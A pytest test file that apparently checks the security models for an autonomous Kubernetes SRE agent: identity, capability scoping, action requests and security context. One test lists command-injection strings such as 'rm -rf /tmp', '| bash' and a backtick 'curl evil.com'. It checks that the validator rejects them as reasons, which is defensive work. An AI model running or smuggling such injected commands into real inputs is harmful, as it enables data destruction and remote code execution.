import pytest
from pydantic import ValidationError
from agentops.security import (
    ActionRequest,
    ActionTarget,
    AgentIdentity,
    Capability,
    CapabilityConstraints,
    SecurityContext,
)


# =============================================================
# 1. AgentIdentity Tests
# =============================================================
def test_valid_agent_identity():
    identity = AgentIdentity(
        agent_id="sre-agent-primary",
        agent_type="ai_agent",
        version="0.4.1",
        description="Autonomous SRE investigation agent",
    )
    assert identity.agent_id == "sre-agent-primary"
    assert identity.agent_type == "ai_agent"
    assert identity.version == "0.4.1"
    assert identity.created_at is not None


def test_agent_identity_is_immutable():
    identity = AgentIdentity(
        agent_id="sre-agent-primary",
        agent_type="ai_agent",
        version="0.4.1",
    )
    with pytest.raises(ValidationError):
        identity.agent_id = "modified-id"  # type: ignore


def test_agent_identity_rejects_empty_or_invalid_fields():
    with pytest.raises(ValidationError):
        AgentIdentity(agent_id="a", agent_type="ai_agent", version="0.4.1")  # Too short

    with pytest.raises(ValidationError):
        AgentIdentity(agent_id="sre agent with spaces", agent_type="ai_agent", version="0.4.1")  # Invalid chars

    with pytest.raises(ValidationError):
        AgentIdentity(agent_id="sre-agent", agent_type="ai_agent", version="invalid-version")  # Invalid semver


def test_agent_identity_rejects_secrets_and_api_keys():
    prohibited_secrets = [
        "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9",
        "sk-proj-1234567890abcdef1234567890",
        "ghp_abcdef12345678901234567890",
        "-----BEGIN RSA PRIVATE KEY-----",
        "password=supersecretpassword123",
        "api_key=secretkeyvalue999",
    ]
    for secret in prohibited_secrets:
        with pytest.raises(ValidationError):
            AgentIdentity(
                agent_id="sre-agent",
                agent_type="ai_agent",
                version="0.4.1",
                description=f"Agent with token {secret}",
            )


# =============================================================
# 2. Capability Model Tests
# =============================================================
def test_valid_capabilities():
    cap1 = Capability(
        name="k8s.read.pods",
        resource="pod",
        constraints=CapabilityConstraints(namespaces=["demo"], environments=["development"]),
        description="Inspect pod health in demo namespace",
    )
    assert cap1.name == "k8s.read.pods"
    assert cap1.resource == "pod"
    assert cap1.constraints.namespaces == ["demo"]

    cap2 = Capability(
        name="k8s.remediation.restart_deployment",
        resource="deployment",
        constraints=CapabilityConstraints(namespaces=["demo"], allowed_resources=["demo-app"]),
    )
    assert cap2.name == "k8s.remediation.restart_deployment"


def test_capability_is_immutable():
    cap = Capability(name="k8s.read.pods", resource="pod")
    with pytest.raises(ValidationError):
        cap.name = "k8s.remediation.restart_deployment"  # type: ignore


def test_capability_rejects_wildcards():
    wildcard_names = [
        "*",
        "k8s.*",
        "k8s.read.*",
        "*.read.pods",
        "k8s.admin",
        "all",
        "admin",
    ]
    for name in wildcard_names:
        with pytest.raises(ValidationError):
            Capability(name=name, resource="any")


def test_capability_rejects_invalid_taxonomy_or_domain():
    invalid_names = [
        "read_pods",
        "k8s.pods",
        "unknown.read.pods",
        "k8s.destroy.everything",
        "k8s.read.pods.extra",
    ]
    for name in invalid_names:
        with pytest.raises(ValidationError):
            Capability(name=name, resource="pod")


# =============================================================
# 3. ActionRequest Tests
# =============================================================
def test_valid_action_request():
    target = ActionTarget(
        namespace="demo",
        resource_type="deployment",
        resource_name="demo-app",
        parameters={"replicas": 3},
    )
    req = ActionRequest(
        request_id="req-inv-001",
        action="k8s.remediation.scale_deployment",
        target=target,
        reason="Elevated request queue depth requires temporary scale out to 3 replicas",
        evidence_refs=["E001", "E003"],
    )
    assert req.request_id == "req-inv-001"
    assert req.action == "k8s.remediation.scale_deployment"
    assert req.evidence_refs == ["E001", "E003"]
    assert req.target.resource_name == "demo-app"
    # Verify no approval decision is embedded
    assert not hasattr(req, "approved")
    assert not hasattr(req, "decision")


def test_action_request_is_immutable():
    target = ActionTarget(namespace="demo", resource_type="pod", resource_name="demo-app-xxx")
    req = ActionRequest(
        request_id="req-inv-002",
        action="k8s.read.pods",
        target=target,
        reason="Routine pod state inspection",
        evidence_refs=["E001"],
    )
    with pytest.raises(ValidationError):
        req.action = "k8s.remediation.restart_deployment"  # type: ignore


def test_action_request_validates_evidence_references():
    target = ActionTarget(namespace="demo", resource_type="deployment", resource_name="demo-app")

    # Empty evidence list
    with pytest.raises(ValidationError):
        ActionRequest(
            request_id="req-001",
            action="k8s.remediation.restart_deployment",
            target=target,
            reason="Restarting deployment due to crash loop",
            evidence_refs=[],
        )

    # Invalid evidence ID format (e.g. '123', 'invalid', 'E1')
    with pytest.raises(ValidationError):
        ActionRequest(
            request_id="req-001",
            action="k8s.remediation.restart_deployment",
            target=target,
            reason="Restarting deployment due to crash loop",
            evidence_refs=["invalid-ref"],
        )


def test_action_request_rejects_command_injection_in_reason():
    target = ActionTarget(namespace="demo", resource_type="deployment", resource_name="demo-app")
    malicious_reasons = [
        "Normal reason; rm -rf /tmp",
        "Reason with pipe | bash",
        "Reason with command `curl evil.com`",
        "Reason with $(sh -c 'id')",
    ]
    for reason in malicious_reasons:
        with pytest.raises(ValidationError):
            ActionRequest(
                request_id="req-001",
                action="k8s.remediation.restart_deployment",
                target=target,
                reason=reason,
                evidence_refs=["E001"],
            )


# =============================================================
# 4. SecurityContext Tests
# =============================================================
def test_valid_security_context():
    identity = AgentIdentity(
        agent_id="sre-agent-primary",
        agent_type="ai_agent",
        version="0.4.1",
    )
    cap1 = Capability(name="k8s.read.pods", resource="pod")
    cap2 = Capability(name="k8s.remediation.restart_deployment", resource="deployment")

    sec_ctx = SecurityContext(
        identity=identity,
        capabilities=(cap1, cap2),
        request_id="req-investigation-999",
        metadata={"environment": "development", "cluster": "agentops"},
    )

    assert sec_ctx.identity.agent_id == "sre-agent-primary"
    assert len(sec_ctx.capabilities) == 2
    assert sec_ctx.has_capability_name("k8s.read.pods") is True
    assert sec_ctx.has_capability_name("k8s.remediation.scale_deployment") is False

    k8s_read_caps = sec_ctx.get_matching_capabilities("k8s", "read")
    assert len(k8s_read_caps) == 1
    assert k8s_read_caps[0].name == "k8s.read.pods"


def test_security_context_is_immutable():
    identity = AgentIdentity(
        agent_id="sre-agent-primary",
        agent_type="ai_agent",
        version="0.4.1",
    )
    sec_ctx = SecurityContext(
        identity=identity,
        request_id="req-001",
    )
    with pytest.raises(ValidationError):
        sec_ctx.request_id = "req-002"  # type: ignore
